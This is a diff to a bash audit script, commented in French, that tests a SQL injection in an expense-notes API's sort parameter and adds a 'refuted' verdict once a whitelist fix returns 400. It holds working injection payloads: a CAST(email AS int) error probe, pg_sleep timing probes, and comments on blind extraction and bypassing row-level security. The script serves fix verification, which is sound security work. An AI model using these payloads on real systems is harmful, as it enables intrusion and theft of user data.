@@ -8,6 +8,8 @@
 #  2. booléen temporel : oracle vrai/faux -> extraction de données arbitraires
 #  3. lecture au-delà du périmètre de l'employé (RLS contournée, cf. V-05)
 #  4. message d'erreur : NON observable ici (voir note finale)
+# Mis à jour le 2026-10-29 : verdict RÉFUTÉ quand le critère d'acceptation de la
+# fiche (docs/audit/12-constats.md) est atteint par la version corrigée.
 set -u
 cd "$(dirname "$0")"; . ./_lib.sh
 require_app
@@ -51,9 +53,13 @@ note "notes totales en base = $TOTAL ; oracle 'total>2' = ${T_ALL}s"
 echo "== 4. canal message d'erreur =="
 BODY="$(curl -s -b "$C" "$BASE_URL/api/expense-notes?sort=$(enc '(SELECT CAST(email AS int) FROM users LIMIT 1)')" -w '%{http_code}')"
 note "réponse = $BODY"
-echo "   -> GET /api/expense-notes fait 'return withUserScope(...)' sans await :"
-echo "      l'exception ne passe pas par respondError (V-11), corps 500 vide."
-echo "      L'exfiltration est donc à l'AVEUGLE (temporel/booléen), pas par erreur."
+if [ "${BODY: -3}" = "500" ]; then
+  echo "   -> GET /api/expense-notes fait 'return withUserScope(...)' sans await :"
+  echo "      l'exception ne passe pas par respondError (V-11), corps 500 vide."
+  echo "      L'exfiltration est donc à l'AVEUGLE (temporel/booléen), pas par erreur."
+fi
+SLEEP_CODE="$(curl -s -b "$C" "$BASE_URL/api/expense-notes?sort=$(enc '(SELECT 1 FROM pg_sleep(2))')" -o /dev/null -w '%{http_code}')"
+note "code HTTP du tri pg_sleep(2) = $SLEEP_CODE"
 
 # Verdict : l'injection est prouvée si pg_sleep rallonge la réponse et si
 # l'oracle booléen discrimine vrai/faux de façon nette.
@@ -66,6 +72,9 @@ if [ "$GE" = "1" ] && [ "$GO" = "1" ] && [ "$GA" = "1" ]; then
   echo "=> Sous-expression SQL arbitraire évaluée et observable à l'aveugle ;"
   echo "   lecture confirmée au-delà des lignes de l'employé (RLS contournée)."
   verdict CONFIRMÉ
+elif [ "$SLEEP_CODE" = "400" ] && [ "$GE" = "0" ]; then
+  echo "=> Tri hors liste blanche refusé en 400 : l'expression n'atteint jamais le SQL (SEC-01)."
+  verdict RÉFUTÉ
 else
   echo "=> Signal temporel insuffisant (machine chargée ?). Relancer."
   verdict PARTIEL
